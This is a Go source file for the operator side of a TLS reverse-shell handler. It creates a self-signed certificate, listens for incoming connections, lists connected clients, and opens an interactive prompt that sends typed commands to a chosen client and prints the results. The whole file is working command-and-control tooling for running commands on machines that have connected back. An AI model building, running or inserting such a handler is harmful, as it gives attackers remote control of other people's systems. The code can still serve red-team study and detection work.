package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"log"
	"os"
	"strings"

	"golang-https-rev/pkg/certs"
	"golang-https-rev/pkg/version"
	"golang-https-rev/pkg/server"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <port> <network-interface>\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s 8443 0.0.0.0\n", os.Args[0])
		os.Exit(1)
	}

	port := os.Args[1]
	networkInterface := os.Args[2]

	log.Println("Generating self-signed certificate...")
	cert, err := certs.GenerateSelfSignedCert()
	if err != nil {
		log.Fatalf("Failed to generate certificate: %v", err)
	}
	log.Println("Certificate generated successfully")

	log.Printf("Version: %s (commit %s, date %s)", version.Version, version.Commit, version.Date)

	// Create TLS config
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	// Create listener
	listener := server.NewListener(port, networkInterface, tlsConfig)
	netListener, err := listener.Start()
	if err != nil {
		log.Fatalf("Failed to start listener: %v", err)
	}
	defer netListener.Close()

	log.Println("Listener ready. Waiting for connections...")
	interactiveShell(listener)
}

func interactiveShell(l *server.Listener) {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("\n=== GOTS - PIPELEEK ===")
	fmt.Println("Commands:")
	fmt.Println("  ls                   - List connected clients")
	fmt.Println("  use <client_id>      - Interact with a specific client")
	fmt.Println("  exit                 - Exit the listener")
	fmt.Println()

	var currentClient string

	for {
		if currentClient == "" {
			fmt.Print("listener> ")
		} else {
			fmt.Printf("shell[%s]> ", currentClient)
		}

		input, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		input = strings.TrimSpace(input)
		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		command := parts[0]

		if currentClient == "" {
			switch command {
			case "ls":
				clients := l.GetClients()
				if len(clients) == 0 {
					fmt.Println("No clients connected")
				} else {
					fmt.Println("\nConnected Clients:")
					for i, addr := range clients {
						fmt.Printf("  %d. %s\n", i+1, addr)
					}
					fmt.Println()
				}

			case "use":
				if len(parts) < 2 {
					fmt.Println("Usage: use <client_id>")
					continue
				}

				var numIdx int
				if _, err := fmt.Sscanf(parts[1], "%d", &numIdx); err != nil {
					fmt.Printf("Invalid client ID: %s\n", parts[1])
					continue
				}

				clients := l.GetClients()
				if numIdx > 0 && numIdx <= len(clients) {
					currentClient = clients[numIdx-1]
					fmt.Printf("Now interacting with: %s\n", currentClient)
					fmt.Println("Type 'background' to return to listener prompt")
				} else {
					fmt.Println("Client not found")
				}

			case "exit":
				return

			default:
				fmt.Printf("Unknown command: %s\n", command)
			}
		} else {
			if input == "background" || input == "bg" {
				fmt.Printf("Backgrounding session with %s\n", currentClient)
				currentClient = ""
				continue
			}

			if err := l.SendCommand(currentClient, input); err != nil {
				fmt.Printf("Error sending command: %v\n", err)
				currentClient = ""
				continue
			}

			resp, err := l.GetResponse(currentClient, 5000000000) // 5 seconds
			if err != nil {
				fmt.Printf("Error getting response: %v\n", err)
				currentClient = ""
				continue
			}

			fmt.Print(resp)
			if !strings.HasSuffix(resp, "\n") {
				fmt.Println()
			}
		}
	}
}
